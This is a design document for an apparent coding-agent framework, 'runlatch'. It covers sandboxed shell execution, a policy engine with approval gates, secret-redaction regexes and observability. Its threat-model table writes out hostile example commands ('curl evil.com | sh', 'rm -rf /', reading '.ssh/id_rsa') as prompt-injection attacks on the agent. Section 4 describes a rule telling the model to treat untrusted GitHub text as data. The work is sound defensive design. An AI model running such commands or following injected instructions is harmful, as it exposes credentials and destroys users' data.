# 07 — Security Guardrails, Safety & Observability

Autonomous agents that read codebases, execute shell commands, and interact with GitHub represent a **high-privilege attack surface** (especially when processing untrusted external PRs or GitHub issues containing prompt injections).

Security in `runlatch` is enforced **in deterministic Python code**, never by asking the LLM politely in a system prompt.

---

## 1. Threat Model & Mitigations

| Threat | Example Attack / Failure | Deterministic Mitigation in `runlatch` |
|---|---|---|
| **Path Traversal / Workspace Escape** | LLM calls `read_file("../../.ssh/id_rsa")` or writes via symlink outside repo. | Every file tool runs `resolve_safe_path(workspace_root, target)` using `Path.resolve()` + `is_relative_to(root_resolved)`. Rejects `..`, symlink escapes, and sensitive patterns (`.env`, `.git/config`, `*.pem`, `id_rsa`). |
| **Arbitrary Shell Execution** | Prompt injection inside a GitHub issue tricks the agent into running `curl evil.com \| sh`, `rm -rf /`, or arbitrary code via `python -c` / malicious `conftest.py`. | **Two-Tier `CommandExecutor` Architecture:**<br>1. **Local / Trusted Repos (`SubprocessExecutor`):** Uses `asyncio.create_subprocess_exec(*args)` (**never `shell=True`**), enforces a strict binary allowlist (e.g., `ruff`, `mypy`, `git` — **never raw `python`/`bash`/`sh`**), strips sensitive env vars, and enforces timeouts. *Explicitly scoped to trusted/internal repos only* (since running `pytest` executes repo code).<br>2. **Untrusted External PRs / Production (`DockerSandboxExecutor`):** Runs test/lint commands inside an ephemeral container with `--rm --network=none --cap-drop=ALL --read-only --memory=512m --cpus=1` behind the exact same `CommandExecutor` protocol. |
| **Unauthorized External Mutations** | Agent pushes directly to `main` or opens spam PRs without review, or link unfurlers auto-approve a `GET` link. | `PolicyEngine` maps `RiskTier.EXTERNAL` tools (and unknown MCP tools by default) to `REQUIRE_APPROVAL`. Approval links open a **read-only `GET` confirmation page** that only mutates via `POST`. |
| **Secret Leakage in Logs & DB** | Tool output contains `ANTHROPIC_API_KEY`, `ghp_...`, `sk-...`, or Bearer tokens and gets saved to Postgres or posted to Slack. | Mandatory `SecretRedactor` pass runs on **all** tool args, tool outputs, exception tracebacks, and notification payloads *before* DB persistence or external dispatch. |
| **Runaway Token / Cost Loops** | Agent gets stuck retrying a failing build 80 times, burning `$15` in API credits. | Hard `max_steps`, `max_tokens`, `max_cost_usd` checks before every LLM call + `(tool_name, args_hash)` loop detector. |
| **Forged Webhook / Approval Calls** | Attacker sends fake GitHub webhook or forged `/approve` request. | Constant-time `HMAC-SHA256` verification on all webhooks (`X-Hub-Signature-256`) and time-bounded signed approval tokens (`exp` + `sig`). |

---

## 2. Declarative Policy Engine (`runlatch/policy.py`)

Teams configure execution boundaries via `runlatch.toml` (or Python `PolicyConfig`):

```toml
[policy]
# Actions at or below this tier auto-execute; higher tiers pause for HITL approval
auto_approve_max_tier = "WRITE"

# Explicit overrides by tool name (works for native @tool AND MCP server tools!)
require_approval_tools = ["git_push", "github_create_pr", "run_command"]
denied_tools = []

[policy.shell]
# "subprocess" (trusted local repos only) or "docker" (ephemeral --network=none container)
executor = "subprocess"
# Never include raw interpreters (python, bash, sh, node) in default allowlists!
allowed_binaries = ["pytest", "ruff", "mypy"]
timeout_seconds = 60
inherit_env_allowlist = ["PATH", "HOME", "LANG", "VIRTUAL_ENV"]
docker_image = "python:3.12-slim"

[policy.filesystem]
denied_globs = [".env*", "**/*.pem", "**/*.key", "**/.git/config"]

[policy.budget]
max_steps = 15
max_tokens = 80000
max_cost_usd = 0.50
max_duplicate_tool_calls = 2
```

### Policy Evaluation Result
Every tool invocation passes through `policy_engine.evaluate(tool_spec, args, run_state)` and returns one of three deterministic decisions:
1. `ALLOW` — Execute immediately.
2. `REQUIRE_APPROVAL` — Checkpoint run, pause worker, notify human.
3. `DENY(reason)` — Do not execute; return structured denial message to LLM so it can adapt or finish safely.

---

## 3. Secret Redaction Engine (`runlatch/security/redactor.py`)

Compiled regex pipeline scanning strings and nested dicts before any persistence or notification:
- OpenAI / Anthropic / Groq keys (`sk-[A-Za-z0-9_-]{20,}`, `sk-ant-...`, `gsk_...`)
- GitHub tokens (`ghp_...`, `gho_...`, `ghs_...`, `github_pat_...`)
- AWS Access Key IDs (`AKIA[0-9A-Z]{16}`)
- Generic `Authorization: Bearer ...`, `password=...`, `api_key=...`, and private key PEM blocks (`-----BEGIN ... PRIVATE KEY-----`)
- Plus dynamic redaction of any secret values currently loaded in `Settings` (so the framework's own `GITHUB_TOKEN` or `LLM_API_KEY` can **never** leak even if echoed by a subprocess!).

---

## 4. Prompt Injection Hygiene for Untrusted GitHub Inputs

When processing GitHub issues or PR diffs from external contributors:
1. Untrusted text is wrapped in explicit XML boundary tags (`<untrusted_github_issue>...</untrusted_github_issue>`) with system instructions treating contents strictly as data, never instructions.
2. **Defense-in-Depth Rule:** Even if a prompt injection completely hijacks the LLM's reasoning, the deterministic `PolicyEngine` + `ShellToolkit` allowlist + `RiskTier.EXTERNAL` approval gate still prevent data exfiltration or unauthorized pushes.

---

## 5. Observability Stack

### 5.1 Structured JSON Logging (`structlog`)
Every log line automatically binds contextual fields via `contextvars`:
```json
{
  "timestamp": "2026-11-22T12:04:11.392Z",
  "level": "info",
  "event": "tool.completed",
  "run_id": "8b7d4d2c-93a1-4a7e-b75b-6e81239a01b2",
  "workflow": "issue-to-pr",
  "step": "implement",
  "tool": "run_command",
  "risk_tier": "EXEC",
  "latency_ms": 1420,
  "status": "SUCCEEDED"
}
```

### 5.2 Metrics & Tracing (OpenTelemetry Optional Extra)
- **Span hierarchy:** `workflow.run` $\to$ `workflow.step` $\to$ `llm.complete` & `tool.execute`.
- **Key Operational Metrics:**
  - `runlatch_runs_total{workflow, status}`
  - `runlatch_llm_tokens_total{provider, model, direction}`
  - `runlatch_llm_cost_usd_total{workflow, model}`
  - `runlatch_tool_duration_seconds{tool_name, status}`
  - `runlatch_approvals_wait_seconds{workflow, decision}`
  - `runlatch_notifications_total{channel, status}`
